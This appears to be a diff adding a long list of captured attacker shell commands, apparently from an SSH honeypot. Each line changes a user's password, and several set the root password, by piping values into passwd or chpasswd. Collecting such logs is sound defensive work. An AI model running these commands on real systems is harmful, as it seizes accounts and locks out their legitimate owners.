+echo -e "steven123\nxg8sK2RElQnY\nxg8sK2RElQnY"|passwd|bash
+echo -e "roy123\nxg8sK2RElQnY\nxg8sK2RElQnY"|passwd|bash
+echo -e "123456\nxg8sK2RElQnY\nxg8sK2RElQnY"|passwd|bash
+echo "franco\n344BVfIxh8gI\n344BVfIxh8gI\n"|passwd
+echo -e "presto\nxg8sK2RElQnY\nxg8sK2RElQnY"|passwd|bash
+echo -e "123456\nHiJuV6zPENYv\nHiJuV6zPENYv"|passwd|bash
+echo -e "presto\nHiJuV6zPENYv\nHiJuV6zPENYv"|passwd|bash
+echo "myblog12345\noIawu4dIpeDM\noIawu4dIpeDM\n"|passwd
+echo "wangyifa\n344BVfIxh8gI\n344BVfIxh8gI\n"|passwd
+echo -e "P455wOrd\nBZRSNeYfe247\nBZRSNeYfe247"|passwd|bash
+echo -e "live\nxg8sK2RElQnY\nxg8sK2RElQnY"|passwd|bash
+echo -e "wirat\nUfQkj0WhFnz8\nUfQkj0WhFnz8"|passwd|bash
+echo "1234567\n344BVfIxh8gI\n344BVfIxh8gI\n"|passwd
+echo -e "nani\n4Rj8P0U1oJGR\n4Rj8P0U1oJGR"|passwd|bash
+echo "testing\nsKUZ5u6NfQd5\nsKUZ5u6NfQd5\n"|passwd
+echo "bodega\n344BVfIxh8gI\n344BVfIxh8gI\n"|passwd
+echo "reklame\n5xW680MGrugX\n5xW680MGrugX\n"|passwd
+echo "live\nM5GoXafDND5j\nM5GoXafDND5j\n"|passwd
+echo "bsnl\n6AYdz5AmGXxx\n6AYdz5AmGXxx\n"|passwd
+echo "mercaderista\nxg8sK2RElQnY\nxg8sK2RElQnY\n"|passwd
+echo "steven123\nxg8sK2RElQnY\nxg8sK2RElQnY\n"|passwd
+echo "roy123\nxg8sK2RElQnY\nxg8sK2RElQnY\n"|passwd
+echo "123456\nxg8sK2RElQnY\nxg8sK2RElQnY\n"|passwd
+echo "presto\nxg8sK2RElQnY\nxg8sK2RElQnY\n"|passwd
+echo "123456\nHiJuV6zPENYv\nHiJuV6zPENYv\n"|passwd
+echo "presto\nHiJuV6zPENYv\nHiJuV6zPENYv\n"|passwd
+echo "wirat\nUfQkj0WhFnz8\nUfQkj0WhFnz8\n"|passwd
+echo "nani\n4Rj8P0U1oJGR\n4Rj8P0U1oJGR\n"|passwd
+echo -e "labochemengui\neuX9fBiLyJZf\neuX9fBiLyJZf"|passwd|bash
+echo "P455wOrd\nBZRSNeYfe247\nBZRSNeYfe247\n"|passwd
+echo "live\nxg8sK2RElQnY\nxg8sK2RElQnY\n"|passwd
+echo "labochemengui\neuX9fBiLyJZf\neuX9fBiLyJZf\n"|passwd
+echo -e "roy123\n5uuUSB6hJgz7\n5uuUSB6hJgz7"|passwd|bash
+echo -e "1234\nVOudrwoqJREJ\nVOudrwoqJREJ"|passwd|bash
+echo "roy123\n5uuUSB6hJgz7\n5uuUSB6hJgz7\n"|passwd
+echo -e "mercaderista\nM7r1Z5ifs2q3\nM7r1Z5ifs2q3"|passwd|bash
+echo -e "mercaderista\nVOudrwoqJREJ\nVOudrwoqJREJ"|passwd|bash
+echo -e "dorothy\npXy8sjSzT3ZC\npXy8sjSzT3ZC"|passwd|bash
+echo "1234\nVOudrwoqJREJ\nVOudrwoqJREJ\n"|passwd
+echo -e "P@ssw0rd\nceizcTK2w6ZU\nceizcTK2w6ZU"|passwd|bash
+echo "mercaderista\nM7r1Z5ifs2q3\nM7r1Z5ifs2q3\n"|passwd
+echo "mercaderista\nVOudrwoqJREJ\nVOudrwoqJREJ\n"|passwd
+echo -e "pers\nRNqqK6lKm6TJ\nRNqqK6lKm6TJ"|passwd|bash
+echo -e "123\n6DdjnlGKFIov\n6DdjnlGKFIov"|passwd|bash
+echo -e "1234\nceizcTK2w6ZU\nceizcTK2w6ZU"|passwd|bash
+echo -e "qingpeng\nRNqqK6lKm6TJ\nRNqqK6lKm6TJ"|passwd|bash
+echo "P@ssw0rd\nceizcTK2w6ZU\nceizcTK2w6ZU\n"|passwd
+echo "dorothy\npXy8sjSzT3ZC\npXy8sjSzT3ZC\n"|passwd
+echo "pers\nRNqqK6lKm6TJ\nRNqqK6lKm6TJ\n"|passwd
+echo "123\n6DdjnlGKFIov\n6DdjnlGKFIov\n"|passwd
+echo -e "adna\niNdTyZ2CQInj\niNdTyZ2CQInj"|passwd|bash
+echo "1234\nceizcTK2w6ZU\nceizcTK2w6ZU\n"|passwd
+echo "qingpeng\nRNqqK6lKm6TJ\nRNqqK6lKm6TJ\n"|passwd
+echo -e "pers\ncr5li69lXAvX\ncr5li69lXAvX"|passwd|bash
+echo -e "wpuser\niNdTyZ2CQInj\niNdTyZ2CQInj"|passwd|bash
+echo "adna\niNdTyZ2CQInj\niNdTyZ2CQInj\n"|passwd
+echo -e "viktor\nHmi4x5pd7nGw\nHmi4x5pd7nGw"|passwd|bash
+echo -e "live\nHmi4x5pd7nGw\nHmi4x5pd7nGw"|passwd|bash
+echo -e "mikem\n4sYBiYxPaFXQ\n4sYBiYxPaFXQ"|passwd|bash
+echo -e "mysql@123\nquVPVlgEiwQ0\nquVPVlgEiwQ0"|passwd|bash
+echo "pers\ncr5li69lXAvX\ncr5li69lXAvX\n"|passwd
+echo -e "mysql@123\nIH6YoNNh72wo\nIH6YoNNh72wo"|passwd|bash
+echo "wpuser\niNdTyZ2CQInj\niNdTyZ2CQInj\n"|passwd
+echo -e "qingpeng\nIH6YoNNh72wo\nIH6YoNNh72wo"|passwd|bash
+echo "viktor\nHmi4x5pd7nGw\nHmi4x5pd7nGw\n"|passwd
+echo "live\nHmi4x5pd7nGw\nHmi4x5pd7nGw\n"|passwd
+echo "mikem\n4sYBiYxPaFXQ\n4sYBiYxPaFXQ\n"|passwd
+echo "mysql@123\nquVPVlgEiwQ0\nquVPVlgEiwQ0\n"|passwd
+echo -e "123456\nIH6YoNNh72wo\nIH6YoNNh72wo"|passwd|bash
+echo -e "pers\nIH6YoNNh72wo\nIH6YoNNh72wo"|passwd|bash
+echo "mysql@123\nIH6YoNNh72wo\nIH6YoNNh72wo\n"|passwd
+echo -e "test\nwch5KthxDoli\nwch5KthxDoli"|passwd|bash
+echo "qingpeng\nIH6YoNNh72wo\nIH6YoNNh72wo\n"|passwd
+echo -e "dp\nwch5KthxDoli\nwch5KthxDoli"|passwd|bash
+echo "123456\nIH6YoNNh72wo\nIH6YoNNh72wo\n"|passwd
+echo -e "node\nwch5KthxDoli\nwch5KthxDoli"|passwd|bash
+echo "test\nwch5KthxDoli\nwch5KthxDoli\n"|passwd
+echo "pers\nIH6YoNNh72wo\nIH6YoNNh72wo\n"|passwd
+echo "dp\nwch5KthxDoli\nwch5KthxDoli\n"|passwd
+echo "node\nwch5KthxDoli\nwch5KthxDoli\n"|passwd
+echo -e "habib\nb8SQuZw6YHVa\nb8SQuZw6YHVa"|passwd|bash
+echo -e "node\nb8SQuZw6YHVa\nb8SQuZw6YHVa"|passwd|bash
+echo -e "mikem\n8deiU7HkYIdt\n8deiU7HkYIdt"|passwd|bash
+echo "root:b8SQuZw6YHVa"|chpasswd|bash
+echo "node\nb8SQuZw6YHVa\nb8SQuZw6YHVa\n"|passwd
+echo "habib\nb8SQuZw6YHVa\nb8SQuZw6YHVa\n"|passwd
+echo "mikem\n8deiU7HkYIdt\n8deiU7HkYIdt\n"|passwd
+echo "root:qVUc2CnCLfnk"|chpasswd|bash
+echo -e "nuwanthi\nH0A49YXGOGsX\nH0A49YXGOGsX"|passwd|bash
+echo "root:NzMGJm0TEDnR"|chpasswd|bash
+echo "nuwanthi\nH0A49YXGOGsX\nH0A49YXGOGsX\n"|passwd
+echo -e "nuwanthi\nMGNOeNqerK7N\nMGNOeNqerK7N"|passwd|bash
+echo "root:774HdRModmel"|chpasswd|bash
+echo -e "4321\nuGuYzJluOtbZ\nuGuYzJluOtbZ"|passwd|bash
+echo -e "wangyifa\nuGuYzJluOtbZ\nuGuYzJluOtbZ"|passwd|bash
+echo -e "franco\nO7rJlrqYajSn\nO7rJlrqYajSn"|passwd|bash
+echo -e "wangyifa\n774HdRModmel\n774HdRModmel"|passwd|bash
+echo "nuwanthi\nMGNOeNqerK7N\nMGNOeNqerK7N\n"|passwd
+echo -e "123456\ngnkfYJQMF57G\ngnkfYJQMF57G"|passwd|bash
+echo -e "franco\nxaFnHXXv8yIb\nxaFnHXXv8yIb"|passwd|bash
+echo "root:g3vN4ChEKIKs"|chpasswd|bash
+echo "4321\nuGuYzJluOtbZ\nuGuYzJluOtbZ\n"|passwd
+echo "wangyifa\nuGuYzJluOtbZ\nuGuYzJluOtbZ\n"|passwd
+echo -e "1\nE7tEcrnUuh7K\nE7tEcrnUuh7K"|passwd|bash
+echo -e "dp\ng3vN4ChEKIKs\ng3vN4ChEKIKs"|passwd|bash
+echo -e "123456\nY9wd0pSRrFNw\nY9wd0pSRrFNw"|passwd|bash
+echo "franco\nO7rJlrqYajSn\nO7rJlrqYajSn\n"|passwd
+echo "wangyifa\n774HdRModmel\n774HdRModmel\n"|passwd
+echo -e "nuwanthi\nvIUIAJllID5Q\nvIUIAJllID5Q"|passwd|bash
+echo "123456\ngnkfYJQMF57G\ngnkfYJQMF57G\n"|passwd
+echo "franco\nxaFnHXXv8yIb\nxaFnHXXv8yIb\n"|passwd
+echo "1\nE7tEcrnUuh7K\nE7tEcrnUuh7K\n"|passwd
+echo "123456\nY9wd0pSRrFNw\nY9wd0pSRrFNw\n"|passwd
+echo "dp\ng3vN4ChEKIKs\ng3vN4ChEKIKs\n"|passwd
+echo "nuwanthi\nvIUIAJllID5Q\nvIUIAJllID5Q\n"|passwd
+echo -e "123123\n87HWkpHufpse\n87HWkpHufpse"|passwd|bash
+echo -e "viktor\nT4cRt1IbPZie\nT4cRt1IbPZie"|passwd|bash
+echo "viktor\nT4cRt1IbPZie\nT4cRt1IbPZie\n"|passwd
+echo "123123\n87HWkpHufpse\n87HWkpHufpse\n"|passwd
+echo -e "123456\n774HdRModmel\n774HdRModmel"|passwd|bash
+echo -e "tmpftp\nWRjFvyqDFxqb\nWRjFvyqDFxqb"|passwd|bash
+echo "tmpftp\nWRjFvyqDFxqb\nWRjFvyqDFxqb\n"|passwd
+echo -e "123456\nesuLbwbxhdvv\nesuLbwbxhdvv"|passwd|bash
+echo "123456\n774HdRModmel\n774HdRModmel\n"|passwd
+echo "123456\nesuLbwbxhdvv\nesuLbwbxhdvv\n"|passwd
+echo -e "tmpftp\nxqceNFoMHfB3\nxqceNFoMHfB3"|passwd|bash
+echo -e "nvidia\nVIULSChUyBrr\nVIULSChUyBrr"|passwd|bash
+echo "tmpftp\nxqceNFoMHfB3\nxqceNFoMHfB3\n"|passwd
+echo "nvidia\nVIULSChUyBrr\nVIULSChUyBrr\n"|passwd
+echo -e "marcob\nYngzcbgISo2Q\nYngzcbgISo2Q"|passwd|bash
+echo -e "tmpftp\n7Q8P8lWaIzz3\n7Q8P8lWaIzz3"|passwd|bash
+echo "marcob\nYngzcbgISo2Q\nYngzcbgISo2Q\n"|passwd
+echo "tmpftp\n7Q8P8lWaIzz3\n7Q8P8lWaIzz3\n"|passwd
+echo -e "labochemengui\nIYzBJsWzuO0R\nIYzBJsWzuO0R"|passwd|bash
+echo -e "tmpftp\nrquDHoNUGVmV\nrquDHoNUGVmV"|passwd|bash
+echo -e "mysql123\n189BsgmYY0kN\n189BsgmYY0kN"|passwd|bash
+echo -e "12345\nN4nLTLSQUofa\nN4nLTLSQUofa"|passwd|bash
+echo "labochemengui\nIYzBJsWzuO0R\nIYzBJsWzuO0R\n"|passwd
+echo "tmpftp\nrquDHoNUGVmV\nrquDHoNUGVmV\n"|passwd
+echo "mysql123\n189BsgmYY0kN\n189BsgmYY0kN\n"|passwd
+echo "12345\nN4nLTLSQUofa\nN4nLTLSQUofa\n"|passwd
+echo -e "wangyifa\niMhLnEsrsJcQ\niMhLnEsrsJcQ"|passwd|bash
+echo -e "1234\nTz9XN4WzD9tS\nTz9XN4WzD9tS"|passwd|bash
+echo -e "123456\nTz9XN4WzD9tS\nTz9XN4WzD9tS"|passwd|bash
+echo -e "fabi\nSCSPDRuujOVX\nSCSPDRuujOVX"|passwd|bash
+echo -e "1234\nSCSPDRuujOVX\nSCSPDRuujOVX"|passwd|bash
+echo -e "presto\nSCSPDRuujOVX\nSCSPDRuujOVX"|passwd|bash
+echo -e "tmpftp\nGcNYslKtft6N\nGcNYslKtft6N"|passwd|bash
+echo -e "start\nGcNYslKtft6N\nGcNYslKtft6N"|passwd|bash
+echo "wangyifa\niMhLnEsrsJcQ\niMhLnEsrsJcQ\n"|passwd
+echo -e "fabi\nGcNYslKtft6N\nGcNYslKtft6N"|passwd|bash
+echo "root:GcNYslKtft6N"|chpasswd|bash
+echo -e "mt\nGcNYslKtft6N\nGcNYslKtft6N"|passwd|bash
+echo -e "comercial\n4frfMcT7v1ho\n4frfMcT7v1ho"|passwd|bash
+echo -e "pers\nlEjjchTyvA7U\nlEjjchTyvA7U"|passwd|bash
+echo "1234\nTz9XN4WzD9tS\nTz9XN4WzD9tS\n"|passwd
+echo "123456\nTz9XN4WzD9tS\nTz9XN4WzD9tS\n"|passwd
+echo -e "wangyifa\nlEjjchTyvA7U\nlEjjchTyvA7U"|passwd|bash
+echo "fabi\nSCSPDRuujOVX\nSCSPDRuujOVX\n"|passwd
+echo "1234\nSCSPDRuujOVX\nSCSPDRuujOVX\n"|passwd
+echo "presto\nSCSPDRuujOVX\nSCSPDRuujOVX\n"|passwd
+echo -e "mysql@123\n4frfMcT7v1ho\n4frfMcT7v1ho"|passwd|bash
+echo "tmpftp\nGcNYslKtft6N\nGcNYslKtft6N\n"|passwd
+echo "start\nGcNYslKtft6N\nGcNYslKtft6N\n"|passwd
+echo "comercial\n4frfMcT7v1ho\n4frfMcT7v1ho\n"|passwd
+echo "fabi\nGcNYslKtft6N\nGcNYslKtft6N\n"|passwd
+echo "mt\nGcNYslKtft6N\nGcNYslKtft6N\n"|passwd
+echo "pers\nlEjjchTyvA7U\nlEjjchTyvA7U\n"|passwd
+echo "wangyifa\nlEjjchTyvA7U\nlEjjchTyvA7U\n"|passwd
+echo "mysql@123\n4frfMcT7v1ho\n4frfMcT7v1ho\n"|passwd
+echo -e "node\n1SymWwdoo2da\n1SymWwdoo2da"|passwd|bash
+echo "node\n1SymWwdoo2da\n1SymWwdoo2da\n"|passwd
+echo -e "password\nVRvBzetXLsRr\nVRvBzetXLsRr"|passwd|bash
+echo "password\nVRvBzetXLsRr\nVRvBzetXLsRr\n"|passwd
+echo -e "mysql@123\nJdcwIdUG43BI\nJdcwIdUG43BI"|passwd|bash
+echo -e "celery\n1lUszeOdw9vm\n1lUszeOdw9vm"|passwd|bash
+echo "mysql@123\nJdcwIdUG43BI\nJdcwIdUG43BI\n"|passwd
+echo -e "estudioremoto\nov1rm03VHh7O\nov1rm03VHh7O"|passwd|bash
+echo "root:O7v8RiS88foW"|chpasswd|bash
+echo "celery\n1lUszeOdw9vm\n1lUszeOdw9vm\n"|passwd
+echo "root:zxR7yuzDsXDm"|chpasswd|bash
+echo -e "encargados\nzxR7yuzDsXDm\nzxR7yuzDsXDm"|passwd|bash
+echo "estudioremoto\nov1rm03VHh7O\nov1rm03VHh7O\n"|passwd
+echo -e "computer\ny8V4Cl5L1hEf\ny8V4Cl5L1hEf"|passwd|bash
+echo "root:y8V4Cl5L1hEf"|chpasswd|bash
+echo -e "J5cmmu=Kyf0-br8CsW\n8TWw1cJtgveN\n8TWw1cJtgveN"|passwd|bash
+echo -e "estudioremoto\nER3vyXgc1SwN\nER3vyXgc1SwN"|passwd|bash
+echo "root:ER3vyXgc1SwN"|chpasswd|bash
+echo -e "franco\nER3vyXgc1SwN\nER3vyXgc1SwN"|passwd|bash
+echo -e "concretyourdev\nIc8krn6XAca5\nIc8krn6XAca5"|passwd|bash
+echo -e "celery\nPkGISOe1VqLc\nPkGISOe1VqLc"|passwd|bash
+echo "root:vG0BRDpFKrcT"|chpasswd|bash
+echo -e "123456\nqz7tPY0uiaQM\nqz7tPY0uiaQM"|passwd|bash
+echo -e "reu\ny8V4Cl5L1hEf\ny8V4Cl5L1hEf"|passwd|bash
+echo "encargados\nzxR7yuzDsXDm\nzxR7yuzDsXDm\n"|passwd
+echo -e "reu\nv3supTU0Wh6Z\nv3supTU0Wh6Z"|passwd|bash
+echo -e "encargados\nKQgBg99TPoia\nKQgBg99TPoia"|passwd|bash
+echo "computer\ny8V4Cl5L1hEf\ny8V4Cl5L1hEf\n"|passwd
+echo "J5cmmu=Kyf0-br8CsW\n8TWw1cJtgveN\n8TWw1cJtgveN\n"|passwd
+echo -e "<Any\nqEdCw22LmOS4\nqEdCw22LmOS4"|passwd|bash
+echo -e "andreas\nmN2hL8hxzdgP\nmN2hL8hxzdgP"|passwd|bash
+echo "estudioremoto\nER3vyXgc1SwN\nER3vyXgc1SwN\n"|passwd
+echo "franco\nER3vyXgc1SwN\nER3vyXgc1SwN\n"|passwd
+echo "concretyourdev\nIc8krn6XAca5\nIc8krn6XAca5\n"|passwd
+echo -e "franco\nQIj9x0gcIZNs\nQIj9x0gcIZNs"|passwd|bash
+echo -e "lyf\ncE43d0MgvG1l\ncE43d0MgvG1l"|passwd|bash
+echo "celery\nPkGISOe1VqLc\nPkGISOe1VqLc\n"|passwd
+echo "123456\nqz7tPY0uiaQM\nqz7tPY0uiaQM\n"|passwd
+echo -e "jennifer123\ncE43d0MgvG1l\ncE43d0MgvG1l"|passwd|bash
+echo "reu\nv3supTU0Wh6Z\nv3supTU0Wh6Z\n"|passwd
+echo -e "concretyourdev\n2KCgFSAZ9jNa\n2KCgFSAZ9jNa"|passwd|bash
+echo -e "concretyourdev\n5BASaptEMy6W\n5BASaptEMy6W"|passwd|bash
+echo "reu\ny8V4Cl5L1hEf\ny8V4Cl5L1hEf\n"|passwd
+echo "<Any\nqEdCw22LmOS4\nqEdCw22LmOS4\n"|passwd
+echo "encargados\nKQgBg99TPoia\nKQgBg99TPoia\n"|passwd
+echo "franco\nQIj9x0gcIZNs\nQIj9x0gcIZNs\n"|passwd
+echo "lyf\ncE43d0MgvG1l\ncE43d0MgvG1l\n"|passwd
+echo "jennifer123\ncE43d0MgvG1l\ncE43d0MgvG1l\n"|passwd
+echo "andreas\nmN2hL8hxzdgP\nmN2hL8hxzdgP\n"|passwd
+echo "concretyourdev\n2KCgFSAZ9jNa\n2KCgFSAZ9jNa\n"|passwd
+echo "concretyourdev\n5BASaptEMy6W\n5BASaptEMy6W\n"|passwd
+echo -e "reklame\n2GHHUoPpmfxM\n2GHHUoPpmfxM"|passwd|bash
+echo -e "azure2\n2GHHUoPpmfxM\n2GHHUoPpmfxM"|passwd|bash
+echo -e "ctejedor\n2GHHUoPpmfxM\n2GHHUoPpmfxM"|passwd|bash
+echo -e "qingpeng\npxZ1KOzXvEnI\npxZ1KOzXvEnI"|passwd|bash
+echo -e "andreas\nqp0rABGf4LZq\nqp0rABGf4LZq"|passwd|bash
+echo "reklame\n2GHHUoPpmfxM\n2GHHUoPpmfxM\n"|passwd
+echo "azure2\n2GHHUoPpmfxM\n2GHHUoPpmfxM\n"|passwd
+echo "ctejedor\n2GHHUoPpmfxM\n2GHHUoPpmfxM\n"|passwd
+echo -e "huyhq\nn1s6QASCo1Hj\nn1s6QASCo1Hj"|passwd|bash
+echo -e "sagar\nujrT8IL30bRX\nujrT8IL30bRX"|passwd|bash
+echo -e "reklame\nujrT8IL30bRX\nujrT8IL30bRX"|passwd|bash
+echo "root:ujrT8IL30bRX"|chpasswd|bash
+echo -e "bodega\nn1s6QASCo1Hj\nn1s6QASCo1Hj"|passwd|bash
+echo -e "mourad\nHJvZjzm1nYa3\nHJvZjzm1nYa3"|passwd|bash
+echo "andreas\nqp0rABGf4LZq\nqp0rABGf4LZq\n"|passwd
+echo "qingpeng\npxZ1KOzXvEnI\npxZ1KOzXvEnI\n"|passwd
+echo "huyhq\nn1s6QASCo1Hj\nn1s6QASCo1Hj\n"|passwd
+echo "sagar\nujrT8IL30bRX\nujrT8IL30bRX\n"|passwd
+echo "reklame\nujrT8IL30bRX\nujrT8IL30bRX\n"|passwd
+echo -e "bodega\ndcKOB15pGSNl\ndcKOB15pGSNl"|passwd|bash
+echo -e "wirat\ndcKOB15pGSNl\ndcKOB15pGSNl"|passwd|bash
+echo "root:dcKOB15pGSNl"|chpasswd|bash
+echo -e "encargados\nqsgIHOuJnU0w\nqsgIHOuJnU0w"|passwd|bash
+echo -e "franklin123\n6ku5qPozUvyl\n6ku5qPozUvyl"|passwd|bash
+echo -e "123456\n6ku5qPozUvyl\n6ku5qPozUvyl"|passwd|bash
+echo "root:5BASaptEMy6W"|chpasswd|bash
+echo -e "123\nTGIhloEmzdHd\nTGIhloEmzdHd"|passwd|bash
+echo -e "produccion\n6ku5qPozUvyl\n6ku5qPozUvyl"|passwd|bash
+echo -e "nuwanthi\nqsgIHOuJnU0w\nqsgIHOuJnU0w"|passwd|bash
+echo "root:YsMrZ2ZCAMbP"|chpasswd|bash
+echo -e "user11\nYsMrZ2ZCAMbP\nYsMrZ2ZCAMbP"|passwd|bash
+echo -e "Passw0rd\nru0ynIOjxvGP\nru0ynIOjxvGP"|passwd|bash
+echo -e "mercaderista\nB9nt5cP0Tp5C\nB9nt5cP0Tp5C"|passwd|bash
+echo -e "marcob\nB9nt5cP0Tp5C\nB9nt5cP0Tp5C"|passwd|bash
+echo -e "simon123\nYsMrZ2ZCAMbP\nYsMrZ2ZCAMbP"|passwd|bash
+echo "root:B9nt5cP0Tp5C"|chpasswd|bash
+echo -e "123456\nYsMrZ2ZCAMbP\nYsMrZ2ZCAMbP"|passwd|bash
+echo -e "ctejedor\nYsMrZ2ZCAMbP\nYsMrZ2ZCAMbP"|passwd|bash
+echo -e "jbquilla\nYsMrZ2ZCAMbP\nYsMrZ2ZCAMbP"|passwd|bash
+echo "root:PZCf9trk5ye2"|chpasswd|bash
+echo -e "goally\nPZCf9trk5ye2\nPZCf9trk5ye2"|passwd|bash
+echo "bodega\nn1s6QASCo1Hj\nn1s6QASCo1Hj\n"|passwd
+echo "mourad\nHJvZjzm1nYa3\nHJvZjzm1nYa3\n"|passwd
+echo "bodega\ndcKOB15pGSNl\ndcKOB15pGSNl\n"|passwd
+echo "wirat\ndcKOB15pGSNl\ndcKOB15pGSNl\n"|passwd
+echo "encargados\nqsgIHOuJnU0w\nqsgIHOuJnU0w\n"|passwd
+echo -e "1234\nFlTqqhhI8AzY\nFlTqqhhI8AzY"|passwd|bash
+echo -e "wirat\n7nzEkGIc2BwZ\n7nzEkGIc2BwZ"|passwd|bash
+echo "root:7nzEkGIc2BwZ"|chpasswd|bash
+echo -e "tootsie\n7nzEkGIc2BwZ\n7nzEkGIc2BwZ"|passwd|bash
+echo "franklin123\n6ku5qPozUvyl\n6ku5qPozUvyl\n"|passwd
+echo "123456\n6ku5qPozUvyl\n6ku5qPozUvyl\n"|passwd
+echo "123\nTGIhloEmzdHd\nTGIhloEmzdHd\n"|passwd
+echo "produccion\n6ku5qPozUvyl\n6ku5qPozUvyl\n"|passwd
+echo "nuwanthi\nqsgIHOuJnU0w\nqsgIHOuJnU0w\n"|passwd
+echo -e "1234\ncGkFffc14hty\ncGkFffc14hty"|passwd|bash
+echo "user11\nYsMrZ2ZCAMbP\nYsMrZ2ZCAMbP\n"|passwd
+echo "Passw0rd\nru0ynIOjxvGP\nru0ynIOjxvGP\n"|passwd
+echo "mercaderista\nB9nt5cP0Tp5C\nB9nt5cP0Tp5C\n"|passwd
+echo "marcob\nB9nt5cP0Tp5C\nB9nt5cP0Tp5C\n"|passwd
+echo "simon123\nYsMrZ2ZCAMbP\nYsMrZ2ZCAMbP\n"|passwd
+echo "123456\nYsMrZ2ZCAMbP\nYsMrZ2ZCAMbP\n"|passwd
+echo "ctejedor\nYsMrZ2ZCAMbP\nYsMrZ2ZCAMbP\n"|passwd
+echo "jbquilla\nYsMrZ2ZCAMbP\nYsMrZ2ZCAMbP\n"|passwd
+echo "1234\nFlTqqhhI8AzY\nFlTqqhhI8AzY\n"|passwd
+echo "wirat\n7nzEkGIc2BwZ\n7nzEkGIc2BwZ\n"|passwd
+echo "tootsie\n7nzEkGIc2BwZ\n7nzEkGIc2BwZ\n"|passwd
+echo "goally\nPZCf9trk5ye2\nPZCf9trk5ye2\n"|passwd
+echo "1234\ncGkFffc14hty\ncGkFffc14hty\n"|passwd
+echo -e "wirat\nlbQlGW5JC6F7\nlbQlGW5JC6F7"|passwd|bash
+echo "wirat\nlbQlGW5JC6F7\nlbQlGW5JC6F7\n"|passwd
+echo -e "1234\neWOPP6quv5fa\neWOPP6quv5fa"|passwd|bash
+echo -e "sshd\nRH6KlIqxLttR\nRH6KlIqxLttR"|passwd|bash
+echo -e "jbquilla\ndiEbKZY8vpgN\ndiEbKZY8vpgN"|passwd|bash
+echo -e "tibero\naNoCAIpYG0B7\naNoCAIpYG0B7"|passwd|bash
+echo "root:Fogk6SCAvxhN"|chpasswd|bash
+echo -e "ctejedor\neWOPP6quv5fa\neWOPP6quv5fa"|passwd|bash
+echo -e "reu\nybdQkemWpOYo\nybdQkemWpOYo"|passwd|bash
+echo -e "renatav\nybdQkemWpOYo\nybdQkemWpOYo"|passwd|bash
+echo -e "marcob\nCjtoNzsfFx53\nCjtoNzsfFx53"|passwd|bash
+echo -e "renatav\nCjtoNzsfFx53\nCjtoNzsfFx53"|passwd|bash
+echo "1234\neWOPP6quv5fa\neWOPP6quv5fa\n"|passwd
+echo -e "zl\nURkEHlHlHlj5\nURkEHlHlHlj5"|passwd|bash
+echo -e "pers\nCjtoNzsfFx53\nCjtoNzsfFx53"|passwd|bash
+echo -e "1234\nybdQkemWpOYo\nybdQkemWpOYo"|passwd|bash
+echo -e "anypass\nCjtoNzsfFx53\nCjtoNzsfFx53"|passwd|bash
+echo -e "system1\nCjtoNzsfFx53\nCjtoNzsfFx53"|passwd|bash
+echo -e "12345\nCjtoNzsfFx53\nCjtoNzsfFx53"|passwd|bash
+echo "sshd\nRH6KlIqxLttR\nRH6KlIqxLttR\n"|passwd
+echo "jbquilla\ndiEbKZY8vpgN\ndiEbKZY8vpgN\n"|passwd
+echo "tibero\naNoCAIpYG0B7\naNoCAIpYG0B7\n"|passwd
+echo -e "12345\neQmw2oo0wDSF\neQmw2oo0wDSF"|passwd|bash
+echo -e "123456\nukdO3IZVe1aq\nukdO3IZVe1aq"|passwd|bash
+echo -e "123456\nDT4AfwOKNMSP\nDT4AfwOKNMSP"|passwd|bash
+echo -e "renatav\ndfx2DMopHkiL\ndfx2DMopHkiL"|passwd|bash
+echo -e "encargados\nukdO3IZVe1aq\nukdO3IZVe1aq"|passwd|bash
+echo "reu\nybdQkemWpOYo\nybdQkemWpOYo\n"|passwd
+echo "renatav\nybdQkemWpOYo\nybdQkemWpOYo\n"|passwd
+echo "marcob\nCjtoNzsfFx53\nCjtoNzsfFx53\n"|passwd
+echo "renatav\nCjtoNzsfFx53\nCjtoNzsfFx53\n"|passwd
+echo "root:zQQxezWScU9F"|chpasswd|bash
+echo "ctejedor\neWOPP6quv5fa\neWOPP6quv5fa\n"|passwd
+echo -e "marcob\neQmw2oo0wDSF\neQmw2oo0wDSF"|passwd|bash
+echo -e "mysql1\neQmw2oo0wDSF\neQmw2oo0wDSF"|passwd|bash
+echo "zl\nURkEHlHlHlj5\nURkEHlHlHlj5\n"|passwd
+echo -e "live\nFwaK51OFAP2l\nFwaK51OFAP2l"|passwd|bash
+echo "pers\nCjtoNzsfFx53\nCjtoNzsfFx53\n"|passwd
+echo -e "marcob\nzQQxezWScU9F\nzQQxezWScU9F"|passwd|bash
+echo -e "marcob\nFeyPfpRAfkPY\nFeyPfpRAfkPY"|passwd|bash
+echo "12345\neQmw2oo0wDSF\neQmw2oo0wDSF\n"|passwd
+echo "1234\nybdQkemWpOYo\nybdQkemWpOYo\n"|passwd
+echo "anypass\nCjtoNzsfFx53\nCjtoNzsfFx53\n"|passwd
+echo "system1\nCjtoNzsfFx53\nCjtoNzsfFx53\n"|passwd
+echo "12345\nCjtoNzsfFx53\nCjtoNzsfFx53\n"|passwd
+echo "marcob\neQmw2oo0wDSF\neQmw2oo0wDSF\n"|passwd
+echo "mysql1\neQmw2oo0wDSF\neQmw2oo0wDSF\n"|passwd
+echo "123456\nukdO3IZVe1aq\nukdO3IZVe1aq\n"|passwd
+echo "123456\nDT4AfwOKNMSP\nDT4AfwOKNMSP\n"|passwd
+echo "renatav\ndfx2DMopHkiL\ndfx2DMopHkiL\n"|passwd
+echo "encargados\nukdO3IZVe1aq\nukdO3IZVe1aq\n"|passwd
+echo "live\nFwaK51OFAP2l\nFwaK51OFAP2l\n"|passwd
+echo "marcob\nzQQxezWScU9F\nzQQxezWScU9F\n"|passwd
+echo "marcob\nFeyPfpRAfkPY\nFeyPfpRAfkPY\n"|passwd
+echo -e "cod4server\n2itNaiEflldh\n2itNaiEflldh"|passwd|bash
+echo "cod4server\n2itNaiEflldh\n2itNaiEflldh\n"|passwd
+echo -e "taoyao\nFEXtfF54m2AM\nFEXtfF54m2AM"|passwd|bash
+echo "root:FEXtfF54m2AM"|chpasswd|bash
+echo -e "Majestickmaje\nT1ERWn5o2Tso\nT1ERWn5o2Tso"|passwd|bash
+echo -e "123456\nTUIYBgQnjHTk\nTUIYBgQnjHTk"|passwd|bash
+echo -e "123456\n3ngTaYUfz4tL\n3ngTaYUfz4tL"|passwd|bash
+echo -e "123456\njQct3sO2fEJe\njQct3sO2fEJe"|passwd|bash
+echo "taoyao\nFEXtfF54m2AM\nFEXtfF54m2AM\n"|passwd
+echo "Majestickmaje\nT1ERWn5o2Tso\nT1ERWn5o2Tso\n"|passwd
